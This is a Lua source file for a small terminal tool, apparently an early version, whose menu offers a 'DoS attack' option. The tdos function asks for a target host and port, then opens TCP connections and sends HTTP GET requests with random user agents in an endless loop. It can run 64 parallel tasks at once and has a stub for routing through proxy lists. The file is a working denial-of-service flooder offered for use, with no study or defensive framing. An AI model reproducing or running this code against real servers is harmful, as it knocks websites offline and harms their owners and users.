-- [ note: This will get progessively more complex and WILL make alot of technical dev ]
-- [       so please refactor every month or two. -garcierjen                          ]
-- [       kls.lua                                                                     ]

local config_content = [[
-- [ note: config for kls -garcierjen ]
-- [ AUTO GENERATED                   ]
-- [ filename: config.lua             ] 
-- DO NOT OBFUSCATE OR COMPILE TO LUAC

local m = {}

m.defaultmode = "tui" -- [ note: cli, tui ]

m.ESC = "Hexadecimal" -- [ note: On different OS have their own ANSI Escape can be change to ]
                      -- [ "Octal", "Ctrl-Key", "Unicode", "Hexadecimal", "Decimal"          ]
                      -- ANSI Escape Sequences doc : https://gist.github.com/ConnerWill/d4b6c776b509add763e17f9f113fd25b
                      -- on unix can be check via echo $COLORTERM or just env and scroll
                      -- edit if weird

--dos
m.tdosportdefault = "https" -- [note: http, https]
m.useproxies = false -- skip proxies txt to lua convert if false
m.uselanes = false -- multithread note: this clogs up thread so fast
m.MAXTASK = 64 --attack in chunks fix thread clog up
             
return m
]] -- og from config.lua

local config
local proxies

local function file_exists(path)
    local f = io.open(path, "r")
    if f then 
        f:close() 
        return true 
    end
    return false
end

if file_exists("config.lua") then
    config = require("config")
else
    print("Config file does not exist. Creating a new one...")
    local file, err = io.open("config.lua", "w")
    if file then
        file:write(config_content)
        file:close()
        config = dofile("config.lua") 
    else
        print("Error creating config file: " .. tostring(err))
    end
end

if config.useproxies then
    local input_filename = "http.txt"
    local output_filename = "proxies.lua"
    local input_file, err = io.open(input_filename, "r")
    if not input_file then
        print("Error opening input file: " .. tostring(err).."skipping")
        return
    end
    local output_file, err = io.open(output_filename, "w")
    if not output_file then
        print("Error opening output file: " .. tostring(err))
        input_file:close()
        return
    end
    output_file:write("local proxies = {\n")
    for line in input_file:lines() do
        local clean_line = line:match("^%s*(.-)%s*$")
        if clean_line ~= "" then
            clean_line = clean_line:gsub('"', '\\"')
            output_file:write(string.format('    "%s",\n', clean_line))
        end
    end
    output_file:write("}\n\nreturn proxies\n")
    input_file:close()
    output_file:close()
    proxies = require("proxies")
end

local colord = require("colord")
local prettytext = require("prettytext")
local socket = require('socket')
local useragent = require("useragent")
local lanes = require("lanes").configure()
local activelanes = {}
local branding = [[
                   _                                     
          ' )   _/                               
          /' _/~                                 
        /'_/~    ____     ____     ____     ____ 
      /\/~     /'    )--)'    )--/'    )--/'    )
    /'  \    /'    /' /'        '---,   /'    /' 
(,/'     \_,(___,/' /'        (___,/   (___,/(__                                                  
]]


local function warn(text)
    io.write(colord:bit16setcolor("default","default","graphic","bold"))
    io.write(colord:b256setcolor(130,"fg").."Warning : "..colord:reset()..tostring(text))
    io.flush()
end


local function exit() -- exit and clean up
    colord:reset()
    colord:erasesavedL()
    colord:eraseall()
    io.write(colord:cursorvis())
    collectgarbage("collect")
    os.exit()
end

-- ================================voids=================================
--[[
    the tui functions start with t ex. tdos
    cli functions start with c ex. cdos
--]]
local function tdos()
    colord:reset()
    colord:erasesavedL()
    colord:eraseall()
    io.write("Target : ")
    local inputhost = io.read()
    if config.tdosportdefault == "https" then
            io.write("Port (note: http = 80, *https = 443) : ")
        elseif config.tdosportdefault == "http" then
            io.write("Port (note: *http = 80, https = 443) : ")
        else
            warn("invaild in tdosportdefault")
            exit()
        end
    local inputport = io.read()
    if tonumber(inputport) == nil then 
        if config.tdosportdefault == "https" then
            inputport = 443 
        elseif config.tdosportdefault == "http" then
            inputport = 80
        else
            warn("invaild in tdosportdefault")
            exit()
        end
    end
    if config.uselanes then
        while true do
            if config.useproxies then
                print("proxies")
            else
                for i = 1, config.MAXTASK do --allocate stuff
                    activelanes[i] = lanes.gen("*", function()
                                        local socket = require("socket")
                                        local useragent = require("useragent")
                                        for i = 1, 10 do
                                            local tcp = assert(socket.connect(tostring(inputhost), tonumber(inputport)))
                                            tcp:send("GET / HTTP/1.1\r\n".."Host: "..string.format("%s:%d",tostring(inputhost),tonumber(inputport)).."\r\nUser-Agent: "..useragent.ua[math.random(1,997)].."\r\n".."Connection: close\r\n\r\n")
                                            tcp:close()
                                            io.write("send ".. inputhost.."\n")
                                        end
                                    end)() -- this run
                end
                for i = 1, #activelanes do  --free
                    local sellanes = activelanes[i]
                    sellanes:cancel()
                    sellanes:join()
                    activelanes[i] = nil
                    io.write("send "..#activelanes.."\n")
                end
                collectgarbage("collect")
            end
        end
        else
            while true do
                if config.useproxies then
                    print("proxies")
                else
                    for i = 1, 10 do
                        local tcp = assert(socket.connect(tostring(inputhost), tonumber(inputport)))
                        tcp:send("GET / HTTP/1.1\r\n".."Host: "..string.format("%s:%d",tostring(inputhost),tonumber(inputport)).."\r\nUser-Agent: "..useragent.ua[math.random(1,997)].."\r\n".."Connection: close\r\n\r\n")
                        tcp:close()
                        io.write("send ".. inputhost.."\n")
                    end
                end
            end
    end
end

-- =======================functions name for tui=========================

local tchoice = {
    dos = "DoS attack the request url",
    exit = "exit"
} -- this only show des

local justrun = {
        dos = {
            run = function() tdos() end
        },
        exit = {
            run = function() exit() end
        }
    } -- alias functions here

-- ======================================================================

local function cli()
    print("cli")
    exit()
end

local function tui()
    -- i can't explain this
    while true do
        io.write("\n")
        colord:reset()
        colord:erasesavedL()
        colord:eraseall()
        io.write(colord:b256setcolor(211,"fg")..branding..colord:reset())
        io.flush()
        io.write("Tools:\n")
        local count = 1 --dynamically count choice (this is stupid)
        local idn = {} -- this would dynamically list choice
        for i, v in pairs(tchoice) do --choice (tui)
            io.write(string.format("    "..colord:b256setcolor(221,"fg").."%d."..colord:b256setcolor(223,"fg").."%s   "..colord:reset().."-"..colord:b256setcolor(226,"fg").."   %s\n"..colord:reset(),count,i,v))
            count = count + 1
            table.insert(idn,i)
        end
        io.write("choice:")
        local input = io.read()
        if tonumber(input) == nil then
            warn("numbers please.\n")
        elseif tonumber(input) > count then
            warn("out of range.\n")
        elseif tonumber(input) == 0 then
            warn("the list start with 1")
        else
            justrun[idn[tonumber(input)]].run()
        end
    end
end

local function main()
    if config.defaultmode == "cli" then
        warn("mode = cli")
        cli()
    elseif config.defaultmode == "tui" then
        warn("mode = tui")
        tui()
    else
        warn("invalid mode")
        exit()
    end
    return 0
end

main()
